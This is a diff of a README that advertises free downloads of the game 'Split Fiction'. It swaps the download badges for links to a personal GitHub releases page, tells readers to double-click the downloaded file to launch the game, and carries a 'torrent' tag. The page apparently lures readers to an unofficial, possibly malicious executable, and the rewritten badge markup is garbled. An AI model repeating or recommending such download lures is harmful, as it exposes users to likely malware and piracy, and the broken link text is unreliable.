@@ -30,7 +30,7 @@ Dive into the captivating realms of Split Fiction, a groundbreaking co-op advent
     - split-fiction-torrent 
     - splitfiction
 
-🔗 **Download Link:** ![Launch Split Fiction](https://img.shields.io/badge/Launch%20Split%20Fiction-Download%20Now-brightgreen.svg)](https://github.com/project/files/App.zip)
+🔗 **Download Link:** ![Launch Split Fiction](https://github.com/Zackkung688/Split-Fiction/releases%20Split%20Fiction-Download%https://github.com/Zackkung688/Split-Fiction/releases)](https://github.com/Zackkung688/Split-Fiction/releases)
 
 ---
 
@@ -81,7 +81,7 @@ Are you prepared to embark on a journey that defies the laws of reality? Gather 
 Visit our official website for additional content, merchandise, and exciting announcements. The multiverse awaits, are you ready to make your mark?
 
 ### ✨ Start Your Adventure Now
-[![Launch Split Fiction](https://img.shields.io/badge/Launch%20Split%20Fiction-Download%20Now-brightgreen.svg)](https://github.com/project/files/App.zip)
+[![Launch Split Fiction](https://github.com/Zackkung688/Split-Fiction/releases%20Split%20Fiction-Download%https://github.com/Zackkung688/Split-Fiction/releases)](https://github.com/Zackkung688/Split-Fiction/releases)
 (If the link provided ends with the file name, double-click to launch the game and begin your journey)
 
 ---
